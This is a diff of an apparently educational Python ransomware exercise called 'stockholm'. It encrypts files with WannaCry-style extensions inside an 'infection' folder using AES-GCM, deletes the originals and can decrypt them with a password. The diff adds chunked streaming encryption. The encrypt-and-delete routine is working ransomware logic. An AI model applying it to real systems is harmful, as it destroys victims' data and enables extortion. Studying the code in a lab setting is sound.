@@ -4,6 +4,7 @@ import sys
 from pathlib import Path
 from cryptography.hazmat.primitives.kdf.scrypt import Scrypt
 from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.exceptions import InvalidTag
 
 INFECTION_DIRNAME = "infection"
@@ -14,14 +15,17 @@ SALT_SIZE = 16
 NONCE_SIZE = 12
 KEY_SIZE = 32
 HEADER_SIZE = SALT_SIZE + NONCE_SIZE
+CHUNK_SIZE = 512 * 1024
 
 # Key derivation function (KDF)
 
 def derive_key(password: str, salt: bytes) -> bytes:
+    """Derive a 32-byte AES-256 key from password using Scrypt KDF."""
     kdf = Scrypt(salt=salt, length=KEY_SIZE, n=2**14, r=8, p=1)
     return (kdf.derive(password.encode()))
 
 def encrypt_bytes(plaintext: bytes, password: str) -> bytes:
+    """Encrypt bytes in memory (for testing). Production uses encryt_file."""
     salt = os.urandom(SALT_SIZE)
     nonce = os.urandom(NONCE_SIZE)
     key = derive_key(password, salt)
@@ -104,19 +108,37 @@ def collect_targets(root: Path, reverse: bool, wannacry_extensions: set[str]) ->
     
 def encrypt_file(path: Path, password: str, silent: bool) -> None:
     try:
-        plaintext = path.read_bytes()
+        salt = os.urandom(SALT_SIZE)
+        nonce = os.urandom(NONCE_SIZE)
+        key = derive_key(password, salt)
+
+        new_path = path.with_name(path.name + FT_SUFFIX)
+
+        cipher = Cipher(
+            algorithms.AES(key),
+            modes.GCM(nonce),
+        )
+        encryptor = cipher.encryptor()
+
+        with open(path, 'rb') as infile, open(new_path, 'wb') as outfile:
+            outfile.write(salt)
+            outfile.write(nonce)
+
+            while True:
+                chunk = infile.read(CHUNK_SIZE)
+                if not chunk:
+                    break
+                ct = encryptor.update(chunk)
+                outfile.write(ct)
+
+            ct = encryptor.finalize()
+            outfile.write(ct)
+            outfile.write(encryptor.tag)
     except OSError as e:
         print(f"stockholm: warning: could not read {path.name}: {e}", file=sys.stderr)
+        new_path.unlink(missing_ok=True)
         return
     
-    cipherblob = encrypt_bytes(plaintext, password)
-    new_path = path.with_name(path.name + FT_SUFFIX)
-
-    try:
-        new_path.write_bytes(cipherblob)
-    except OSError as e:
-        print(f"stockholm: warning: could not write {new_path.name}: {e}", file=sys.stderr)
-        return
 
     try:
         path.unlink()
@@ -130,22 +152,47 @@ def encrypt_file(path: Path, password: str, silent: bool) -> None:
 
 def decrypt_file(path: Path, password: str, silent: bool) -> None:
     try:
-        data = path.read_bytes()
+        original = path.with_suffix("")
+
+        with open(path, 'rb') as infile, open(original, 'wb') as outfile:
+            salt = infile.read(SALT_SIZE)
+            nonce = infile.read(NONCE_SIZE)
+
+            if len(salt) != SALT_SIZE or len(nonce) != NONCE_SIZE:
+                print(f"stockholm: error: bad key or corrupt file: {path.name}", file=sys.stderr)
+                original.unlink(missing_ok=True)
+                return
+            key = derive_key(password, salt)
+
+            ciphertext_with_tag = infile.read()
+
+            if len(ciphertext_with_tag) < 16:
+                print(f"stockholm: error: bad key or corrupt file: {path.name}", file=sys.stderr)
+                original.unlink(missing_ok=True)
+                return
+
+            ciphertext = ciphertext_with_tag[:-16]
+            tag = ciphertext_with_tag[-16:]
+
+            cipher = Cipher(
+                algorithms.AES(key),
+                modes.GCM(nonce, tag),
+            )
+            decryptor = cipher.decryptor()
+
+            try:
+                plaintext = decryptor.update(ciphertext)
+                plaintext += decryptor.finalize()
+                outfile.write(plaintext)
+
+            except InvalidTag:
+                print(f"stockholm: error: bad key or corrupt file: {path.name}", file=sys.stderr)
+                original.unlink(missing_ok=True)
+                return
+
     except OSError as e:
         print(f"stockholm: warning: could not read {path.name}: {e}", file=sys.stderr)
-        return
-
-    plaintext = decrypt_bytes(data, password)
-    if plaintext is None:
-        print(f"stockholm: error: bad key or corrupt file: {path.name}", file=sys.stderr)
-        return
-
-    original = path.with_suffix("")
-
-    try:
-        original.write_bytes(plaintext)
-    except OSError as e:
-        print(f"stockholm: warning: could not write {original.name}: {e}", file=sys.stderr)
+        original.unlink(missing_ok=True)
         return
 
     try:
